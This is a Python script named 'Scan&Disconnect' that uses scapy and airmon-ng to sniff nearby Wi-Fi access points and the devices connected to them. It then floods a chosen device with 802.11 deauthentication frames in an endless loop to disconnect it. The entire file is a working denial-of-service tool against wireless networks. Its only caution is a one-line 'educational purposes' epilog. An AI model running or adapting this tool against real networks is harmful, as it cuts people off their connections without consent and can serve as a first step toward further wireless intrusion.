# Authors: Shir, Hodaya and Alexey
# Version: 1.3
# Date: 03/2019
# Source:
#		http://www.bitforestinfo.com/2017/06/how-to-create-wifi-sniffer-using-python-and-scapy.html
#		https://www.shellvoide.com/python/finding-connected-stations-of-access-point-python-scapy/ 
#  		https://github.com/veerendra2/wifi-deauth-attack/blob/master/deauth.py 

# libraries
import argparse
import os
import subprocess
import re
import sys
from threading import Lock
from time import sleep
try:
	from scapy.all import *
except ImportError:
    	print("[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'")
	exit(1)

# Colours for print
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'

# Strings
cstr_startAP = "Table Access Points"
cstr_endAP = "FIN"
cstr_tableID = "INDEX"
cstr_tableSSID = "SSID"
cstr_tableBSSID = "BSSID"
cstr_tableChannel = "CHANNEL"
cstr_DEVICES= "DEVICES"

# Channels
channels=[1,2,3,4,5,6,7,8,9,10,11,12,13,14]
global channel

# Found access point lists and channels
ap_list = []
ap_list_channel = []

# Found devices
BSSID = []
devices = []

# This function switches between channels
# Thanks to https://github.com/GalTurgeman/Sniff-Deauth/blob/master/mySniff.py
def scanChannel(wlan):
	with lock:
        	try:
	        	next = 0
			global channel
	                channel = 1
		    	global dead
        	    	while dead:
        	        	try:
        	            		time.sleep(0.5)
        	            		os.system('iwconfig %s channel %d' % (wlan, channel))
        	            		tmp_channel = channels[next%14]
        	            		next += 1
        	            		if (tmp_channel != 0 and tmp_channel != channel):
        	                		channel = tmp_channel
        	        	except KeyboardInterrupt:
        	        		print(RED+"\nSTOPPED BY USER"+ENDC)
					exit(0)
        	except KeyboardInterrupt:
        		print(RED+"\nSTOPPED BY USER"+ENDC)
			exit(0)

# Print our logo
def logo():
	OurLogo = ""
	for row in range(7):
		i = 7 - row
		#  Printing Stars '*' in Right Angle Triangle Shape
		for j in range(0, i):
			OurLogo = OurLogo + "*"
		for j in range(0, 7-i):
			OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in A Shape		
		for col in range(5):
			if(col == 0 or col == 4) or ((row == 0 or row == 3) and (col > 0 and col < 4)):
				OurLogo = OurLogo + "*"
			else:
				OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in S Shape		
		for col in range(5):
			if((row == 0 or row == 3 or row == 6) and (col > 0 and col < 4)) or ((row == 1 or row == 2) and (col == 0)) or ((row == 4 or row == 5) and (col == 4)):
				OurLogo = OurLogo + "*"
			else:
				OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in H Shape
		for col in range(5):
			if(col == 0 or col == 3) or (row == 3 and (col > 0 and col < 4)):
				OurLogo = OurLogo + "*"
			else:
				OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in Left Angle Triangle Shape
		for j in range(0, 7-i):
			OurLogo = OurLogo + " "
		for j in range(0, i):
			OurLogo = OurLogo + "*"
		OurLogo = OurLogo + "\n"
	print(OurLogo)

# Print banner with info
def banner():
    	print("\n+--------------------------------------------------------------------------------------------+")
    	print("|Scan&Disconnect v1.3                                                                        |")
    	print("|Coded by Alexey, Hodaya & Shir                                                              |")
    	print("|Sources:                                                                                    |")
    	print("|http://www.bitforestinfo.com/2017/06/how-to-create-wifi-sniffer-using-python-and-scapy.html |")
	print("|https://www.shellvoide.com/python/finding-connected-stations-of-access-point-python-scapy/  |")
	print("|https://github.com/veerendra2/wifi-deauth-attack/blob/master/deauth.py                      |")
	print("+--------------------------------------------------------------------------------------------+\n")

# For extraction of available access points
def PacketHandler(pkt):
	try:
		global channel		
		# pkt.haslayer(scapy.Dot11Elt), this situation helps us filter Dot11Elt traffic from various types of packets
		# pkt.type == 0, this filter helps us filter management frame from packet
		# pkt.subtype == 8, this filter helps us filter beacon from captured packets
		if (pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 8):
			# This function will verify not to print same access point again and again
  			if (pkt.addr2 not in ap_list):
   				# append access point to list
				ap_list.append(pkt.addr2)
				ap_list_channel.append(channel)
   				# Print packet informations
				if (pkt.info == '' or pkt.getlayer(Dot11Elt).ID != 0):
					print("{:^10}".format(len(ap_list))+"{:^45}".format('Hidden Network')+"{:^25}".format(pkt.addr2)+"{:^10}".format(str(channel)))
				else:
					print("{:^10}".format(len(ap_list))+"{:^45}".format(pkt.info)+"{:^25}".format(pkt.addr2)+"{:^10}".format(str(channel)))
	except KeyboardInterrupt:
        	print(RED+"\nSTOPPED BY USER"+ENDC)
		exit(0)			

# Print header of access points table 
def PrintAPTable():
	print(cstr_startAP.center(90,'_'))
	print(cstr_tableID.center(10,' ')+cstr_tableSSID.center(45,' ')+cstr_tableBSSID.center(25,' ')+cstr_tableChannel.center(10,' '))	

# For the extraction of available devices
def pkt_devices(pkt):
	try:
		if (pkt.haslayer(Dot11)):
			# This means it's data frame
			sn = pkt.getlayer(Dot11).addr2
			rc = pkt.getlayer(Dot11).addr1     
			bssid = BSSID[0]
			if (rc != "ff:ff:ff:ff:ff:ff" and sn != "ff:ff:ff:ff:ff:ff"):
				if (sn == bssid or rc == bssid):
					if (sn == bssid):
						if rc not in devices:
        		    				devices.append(rc)
							# Print packet informations
							print("{:^10}".format(len(devices))+"{:^25}".format(rc))
						elif (rc == bssid):
							if sn not in devices:
        		    					devices.append(sn)
								# Print packet informations
								print("{:^10}".format(len(devices))+"{:^25}".format(sn))
	except KeyboardInterrupt:
        	print(RED+"\nSTOPPED BY USER"+ENDC)
		exit(0)
				

# Print header of access points table 
def PrintDeviceTable():
	print("\nIn "+BSSID[0]+" the devices found are: ")
	print(cstr_DEVICES.center(35,'_'))
	print(cstr_tableID.center(10,' ')+cstr_tableBSSID.center(25,' '))

# Graphic spinner
def spinner():
	while True:
        	for cursor in '|/-\\':
	            yield cursor

spin = spinner()

# Disconnect the chosen device from AP
def send_deauth(wlan, ap_choice, device_choice):
	global dead
    	pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=devices[device_choice], addr2=ap_list[ap_choice], addr3=ap_list[ap_choice])/scapy.all.Dot11Deauth()
	print(GREEN+"[*] Sending Deauthentication Packets to -> "+ap_list[ap_choice]+" from "+devices[device_choice]+ENDC)
	while True:
        	try:
            		sys.stdout.write("\b{}".format(next(spin)))
            		sys.stdout.flush()
            		scapy.all.sendp(pkt, iface=wlan, count=1, inter=.2, verbose=0)
        	except KeyboardInterrupt:
	    		dead = False
            		print(BOLD+"\nKAKA ;)"+ENDC)
	    		exit(0)

# Main trigger
if __name__=="__main__":
	logo()

	# Parser of arguments from command line	
	parser = argparse.ArgumentParser(description='Sends deauthentication packets to a device in the wifi network - which results \
                                                      in the disconnection of the device from the network.  [Coded by Shir, Hodaya & Alexey]',
					epilog="Please use the program for educational purposes.")
	parser.add_argument('-w', action='store', dest='wlan', type = str, default = "wlan0", help='iface for monitoring')
    	parser.add_argument('-a', action='store', dest='tAP', type = int, default = 50, help='timeout for AP')
	parser.add_argument('-d', action='store', dest='tDevice', type = int, default = 200, help='timeout for device')
    	parser.add_argument('-v', action='version', version='%(prog)s 1.3')
    	results = parser.parse_args()

	# Only root    	
	if not os.geteuid() == 0:
        	print(RED+"[-] Script must run with 'sudo'"+ENDC)
        	exit(1)
	banner()

	# Variables for thread	
	lock = Lock()
	global dead
	dead = True

	# Print default setting
	if (len(sys.argv) < 2):
		print("You choose default setting: ")
		print("\t1. iface = "+str(results.wlan))
		print("\t2. timeout for AP = "+str(results.tAP))
		print("\t3. timeout for device = "+str(results.tDevice))

	# Read iface from command line or default
	try:
		p = subprocess.Popen(['airmon-ng', 'start', results.wlan])
		p.wait()
		wlan = results.wlan + 'mon'
	except NameError:
		print(RED+"[-] "+str(results.wlan)+" does not exist"+ENDC)
        	exit(1)
	PrintAPTable()

	# Run all relevant commands to operate in monitor mode
 	# Previous function trigger (here, iface for the interface with monitor mode enable)
	try:	
            	thread = threading.Thread(target = scanChannel, args=(wlan,), name = "scanChannel")
            	thread.daemon = True
		thread.start()		
		sniff(iface = wlan, prn = PacketHandler, timeout = results.tAP)
	except socket.error:
		dead = False
		print(RED+"[-] monitore mode does not work'"+ENDC)
        	exit(1)
	print(cstr_endAP.center(90,'-'))

	# Chose wanted AP
	print("Input the index of the AP you want to scan: ")	
	ap_choice = input()
	ap_choice = ap_choice-1
	x = 1
	# Check your choose
	if type(ap_choice) == type(x) and ap_choice < len(ap_list) and ap_choice > -1:	
		BSSID.append(ap_list[ap_choice])
	else:
		dead = False		
		print(RED+"[-] Illegal index"+ENDC)
		exit(0)

	# Device part
    	PrintDeviceTable()
	try:    		
		sniff(iface = wlan, prn = pkt_devices, timeout = results.tDevice)
	except socket.error:
		dead = False		
		print(RED+"[-] monitore mode does not work"+ENDC)
        	exit(1)
	print(cstr_endAP.center(35,'-'))

	# Chose wanted AP
	print("Input the index of the device you want to disconnect: ")	
	device_choice = input()
	device_choice = device_choice-1
	# Check your choose
	if type(device_choice) == type(x) and device_choice < len(devices) and device_choice > -1:	
		send_deauth(wlan, ap_choice, device_choice)
	else:
		dead = False		
		print(RED+"[-] Illegal index"+ENDC)
		exit(0)
